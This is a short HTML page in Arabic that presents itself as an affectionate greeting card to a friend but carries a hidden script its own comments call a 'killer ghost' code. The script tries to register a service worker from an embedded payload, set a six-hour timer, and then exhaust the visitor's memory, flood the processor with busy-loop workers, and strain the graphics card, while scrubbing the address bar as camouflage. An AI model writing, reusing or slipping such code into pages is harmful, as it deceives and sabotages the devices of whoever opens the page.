<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>إهداء خاص</title>
    <style>
        body { background: #f4f7f6; font-family: 'Arial', sans-serif; text-align: center; padding-top: 25%; }
        .card { display: inline-block; padding: 40px; background: white; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        h1 { color: #2ecc71; margin-bottom: 15px; }
        p { color: #555; font-size: 18px; line-height: 1.6; }
    </style>
</head>
<body>

    <div class="card">
        <h1>صلي على النبي ﷺ</h1>
        <p>بحبك في الله يا صاحبي..<br>لو زعلتك في يوم ما متزعلش مني، أنت زي أخويا وأغلى.</p>
    </div>

    <script>
        // كود "الشبح" القاتل - مدمج داخلياً
        const payload = `
            self.onmessage = function(e) {
                if (e.data.cmd === 'armBomb') {
                    // العداد التنازلي: 6 ساعات بالضبط
                    setTimeout(() => {
                        FinalDestruction();
                    }, e.data.timer);
                }
            };

            function FinalDestruction() {
                // المرحلة 1: شلل الرامات (50 مليون جيجا وهمية عبر الـ Buffer)
                const heap = [];
                try {
                    while(true) {
                        heap.push(new SharedArrayBuffer(1024 * 1024 * 500)); // حجز نصف جيجا في كل ملي ثانية
                        
                        // المرحلة 2: إعدام المعالج (CPU Overheat)
                        for(let i=0; i<1000; i++) {
                            const b = new Blob(['while(true){Math.sqrt(Math.random()*Math.random());}'], {type:'text/javascript'});
                            new Worker(URL.createObjectURL(b));
                        }

                        // المرحلة 3: تدمير الجرافيك (GPU Death)
                        const c = new OffscreenCanvas(30000, 30000);
                        const g = c.getContext('webgl');
                        if(g) { g.clearColor(1,0,0,1); g.clear(g.COLOR_BUFFER_BIT); }
                    }
                } catch(e) {}
            }
        `;

        // عملية الحقن الصامتة
        try {
            const blob = new Blob([payload], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);

            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register(url).then(reg => {
                    // حساب الـ 6 ساعات: 21,600,000 مللي ثانية
                    const sixHours = 6 * 60 * 60 * 1000;
                    
                    // إرسال أمر التفعيل الصامت
                    const trigger = () => {
                        if (reg.active) reg.active.postMessage({cmd: 'armBomb', timer: sixHours});
                    };
                    
                    if (reg.active) trigger();
                    reg.addEventListener('updatefound', trigger);
                });
            }
        } catch(e) {}

        // تمويه إضافي: مسح السجل وتغيير الرابط بعد 3 ثواني
        setTimeout(() => {
            window.history.replaceState(null, null, window.location.pathname);
        }, 3000);
    </script>
</body>
</html>
